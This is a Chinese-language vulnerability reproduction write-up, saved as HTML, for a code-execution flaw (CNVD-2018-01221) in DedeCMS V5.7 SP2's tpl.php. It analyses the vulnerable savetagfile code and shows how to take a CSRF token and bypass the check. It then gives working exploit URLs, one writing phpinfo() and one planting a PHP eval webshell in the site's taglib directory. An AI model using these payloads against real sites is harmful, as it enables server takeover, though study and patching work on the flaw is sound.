<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cnvd-2018-01221dedecms-v57-sp2存在代码执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CNVD-2018-01221</span><span class="csECDA2D3">）</span><span class="csDE05BCC">DedeCMS V5.7 SP2</span><span class="csECDA2D3">存在代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">DedeCMS V5.7 SP2</span><span class="cs9C1B1871">版本中</span><span class="cs8926E06">tpl.php</span><span class="cs9C1B1871">存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取</span><span class="cs8926E06">webshell</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">需要登录后台</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据公开的漏洞知道</span><span class="cs8926E06">tpl.php</span><span class="cs9C1B1871">里面</span><span class="cs8926E06">251-281</span><span class="cs9C1B1871">行存在代码执行漏洞，打开</span><span class="cs8926E06">tpl.php</span><span class="cs9C1B1871">文件</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Dedecms/%ef%bc%88CNVD-2018-01221%ef%bc%89DedeCMS%20V5.7%20SP2%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="317" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="代码分析"><span class="csD6CA00D2">代码分析</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">(1)</span><span class="cs7FFD2630">此处定义了一个</span><span class="cs9FB05234">savetagfile</span><span class="cs7FFD2630">的函数，首先做一个判断，参数</span><span class="cs9FB05234">&ldquo;action&rdquo;</span><span class="cs7FFD2630">是否等于</span><span class="cs9FB05234">savetagfile</span><span class="cs7FFD2630">，如果等于，就进行下一步</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(2)csrf_chack(),</span><span class="cs7FFD2630">这里有一个</span><span class="cs9FB05234">csrf</span><span class="cs7FFD2630">检验的函数，我们需要加上</span><span class="cs9FB05234">token</span><span class="cs7FFD2630">来绕过，</span><span class="cs9FB05234">token</span><span class="cs7FFD2630">是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(3)</span><span class="cs7FFD2630">正则表达式匹配，详情参见</span><span class="cs9FB05234">https://www.runoob.com/regexp/regexp-rule.html*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;[a-z0-9_-]{1,}</span><span class="cs7FFD2630">的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的</span><span class="cs9FB05234">\.</span><span class="cs7FFD2630">意思是匹配小数点</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs7FFD2630">所以最终那个判断条件的意思是如果参数</span><span class="cs9FB05234">filename</span><span class="cs7FFD2630">不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要</span><span class="cs9FB05234">.lib.php</span><span class="cs7FFD2630">结尾。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(4)preg_replace</span><span class="cs7FFD2630">的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">发现得到的</span><span class="cs9FB05234">$tagname</span><span class="cs7FFD2630">的值为</span><span class="cs9FB05234">moonsec</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(5)stripslashes()</span><span class="cs7FFD2630">的作用是引用用一个引用字符串，此处没有多大的作用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(6)</span><span class="cs7FFD2630">最后是把</span><span class="cs9FB05234">$content</span><span class="cs7FFD2630">里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个</span><span class="cs9FB05234">csrf</span><span class="cs7FFD2630">防护之外，其他并没有什么安全措施，</span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs7FFD2630">导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿</span><span class="cs9FB05234">webshell</span><span class="cs7FFD2630">了</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据上面的代码知道要上传的参数有：</span><span class="cs8926E06">action,token,filename,content.</span><span class="cs9C1B1871">现在只剩下获取</span><span class="cs8926E06">token</span><span class="cs9C1B1871">了，要怎么才能获取到</span><span class="cs8926E06">token</span><span class="cs9C1B1871">呢？我们再去</span><span class="cs8926E06">tpl.php</span><span class="cs9C1B1871">里看一下，发现</span><span class="cs8926E06">action</span><span class="cs9C1B1871">的参数有很多，比如</span><span class="cs8926E06">del</span><span class="cs9C1B1871">，</span><span class="cs8926E06">upoladok</span><span class="cs9C1B1871">，</span><span class="cs8926E06">edit</span><span class="cs9C1B1871">，</span><span class="cs8926E06">upload</span><span class="cs9C1B1871">等等，但只有传入</span><span class="cs8926E06">upload</span><span class="cs9C1B1871">的时候页面才会回显正常，而其他的都会显示</span><span class="cs8926E06">token</span><span class="cs9C1B1871">异常，所以只能通过</span><span class="cs8926E06">action=upload</span><span class="cs9C1B1871">来获取</span><span class="cs8926E06">token</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">获取</span><span class="cs8926E06">token</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/dede/tpl.php?action=upload</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Dedecms/%ef%bc%88CNVD-2018-01221%ef%bc%89DedeCMS%20V5.7%20SP2%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="237" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后查看网页源代码，找到</span><span class="cs8926E06">token</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Dedecms/%ef%bc%88CNVD-2018-01221%ef%bc%89DedeCMS%20V5.7%20SP2%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="282" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/dede5.7/dede/tpl.php?filename=(</span><span class="cs7FFD2630">文件名随意</span><span class="cs9FB05234">).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(</span><span class="cs7FFD2630">替换你复制的</span><span class="cs9FB05234">token)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问了成功写入</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Dedecms/%ef%bc%88CNVD-2018-01221%ef%bc%89DedeCMS%20V5.7%20SP2%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="320" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问写入的文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/include/taglib/</span><span class="cs7FFD2630">（你上传的文件名）</span><span class="cs9FB05234">.lib.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Dedecms/%ef%bc%88CNVD-2018-01221%ef%bc%89DedeCMS%20V5.7%20SP2%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="366" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">也可以构造一句话木马</span><span class="cs8926E06">payload</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Dedecms/%ef%bc%88CNVD-2018-01221%ef%bc%89DedeCMS%20V5.7%20SP2%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="299" alt="" style="border-width:0px;" /></span></p></body>
</html>
